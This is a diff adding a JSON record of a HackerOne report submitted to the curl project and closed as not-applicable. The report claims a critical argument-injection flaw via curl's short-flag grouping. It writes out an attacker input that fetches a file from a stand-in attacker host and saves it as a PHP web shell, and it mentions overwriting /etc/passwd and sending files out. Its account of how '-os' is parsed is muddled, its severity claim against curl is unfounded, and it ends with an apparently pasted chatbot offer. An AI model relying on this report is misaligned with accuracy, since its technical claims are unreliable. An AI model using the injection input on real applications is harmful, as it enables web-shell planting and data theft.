@@ -1,0 +1,186 @@
+{
+  "id": 3669305,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjY5MzA1",
+  "url": "https://hackerone.com/reports/3669305",
+  "title": "Argument Injection via curl Short-Flag Grouping",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "critical",
+  "readable_substate": "N/A",
+  "created_at": "2026-04-13T05:18:04.693Z",
+  "submitted_at": "2026-04-13T05:18:05.407Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "midoussa7",
+    "url": "/midoussa7",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-04-13T07:10:29.935Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-04-13T07:10:29.498Z",
+  "team_member_agreed_on_going_public_at": "2026-04-13T07:04:58.837Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This report details how the curl -os command facilitates an Argument Injection vulnerability in applications that wrap the curl command-line tool.\nThe specific command curl -os /etc/passwd --url http://example.com demonstrates a subtle but dangerous behavior. Because -s (silent) follows -o (output), curl expects the very next string to be the filename.In this scenario:The -o flag consumes the next argument (/etc/passwd).The -s flag tells curl to suppress the progress meter and error messages.The --url flag specifies the source of the data.This effectively turns a \"downloader\" into a \"file overwriter.\"\n Root Cause Analysis\nThe root cause is insufficient input validation and the unsafe use of command-line wrappers.Flag Grouping: Like most Unix-style utilities, curl allows \"short-flag grouping.\" When a user inputs -os, curl interprets this as two separate flags: -o (output to a file) and -s (silent mode).Missing Delimiters: If an application executes a command like curl $USER_INPUT, it assumes the input will be a URL. However, if the input starts with a dash (-), curl treats it as a command-line argument rather than a string.Shell Interpretation: Many developers use functions like os.system() or exec() which pass a raw string to the system shell, allowing the shell to parse the attacker's injected flags as if they were part of the original command structure.\n4. Proof of Concept (PoC)Scenario:\n A web application allows a user to \"check if a URL is alive\" by running a backend command: curl [USER_URL].\n\n5.Steps to Reproduce:\n\nAttacker Input: \n1-Instead of a URL,\n the attacker enters: -os /var/www/html/shell.php --url http://attacker.com \n2- Backend Execution:\n The server executes the concatenated string:curl -os /var/www/html/shell.php --url http://attacker.com Result: curl silently downloads the malicious_script.txt and saves it as shell.php in the web \n3-rootExploitation: \nThe attacker navigates to http://victim.com to execute their code.\n\n## Impact\n\n## Summary:\nThe impact of this vulnerability is typically categorized as High to Critical, depending on the environment:Arbitrary File Write: An attacker can use the -o (or --output) flag to write the contents of a URL to any location the application has permission to access.System Defacement/DDoS: By overwriting .html or .js files, an attacker can deface a website.Remote Code Execution (RCE): By overwriting a .sh script, a crontab, or a .php file in a web directory, an attacker can execute arbitrary code on the server.Data Exfiltration: Using the -F (form) or -d (data) flags, an attacker could redirect sensitive local files to their own remote server\n5. Remediation \nRecommendationsPrimary Fix: Use a library (e.g., libcurl for C, requests for Python) instead of calling the system's curl binary.Argument Separation: If the CLI must be used, use the -- separator to tell curl that all following strings are URLs and not flags:Safe: curl -- [USER_INPUT]Sanitization: Disallow any input that begins with a hyphen (-) or contains shell metacharacters (;, &, |).Would you like a Python or Node.js code example showing the \"safe\" vs. \"unsafe\" way to handle these commands?",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "coder_mohammed",
+    "2026",
+    "raijuna",
+    "whathehack81",
+    "sn0xsharma",
+    "charlieboi415",
+    "cookesan",
+    "emansecio",
+    "r6rosinaldonevesr6",
+    "serafine",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3669305",
+  "votes": 23,
+  "latest_disclosable_activity_at": "2026-04-13T07:10:30.411Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:20:07.786506",
+    "source": "https://hackerone.com/reports/3669305.json",
+    "report_id": 3669305
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjY5MzA1",
+    "databaseId": "3669305",
+    "title": "Argument Injection via curl Short-Flag Grouping",
+    "url": "https://hackerone.com/reports/3669305",
+    "state": null,
+    "substate": "not-applicable",
+    "disclosed_at": "2026-04-13T07:10:29.935Z",
+    "created_at": "2026-04-13T05:18:04.693Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU4",
+      "name": "Command Injection - Generic",
+      "external_id": "cwe-77"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": null
+    },
+    "reporter": {
+      "username": "midoussa7"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM2NjkzMDU=",
+    "_id": "3669305",
+    "disclosed": true,
+    "votes": 23,
+    "latest_disclosable_activity_at": "2026-04-13T07:10:30.411Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjY5MzA1",
+      "databaseId": "3669305",
+      "title": "Argument Injection via curl Short-Flag Grouping",
+      "url": "https://hackerone.com/reports/3669305",
+      "disclosed_at": "2026-04-13T07:10:29.935Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
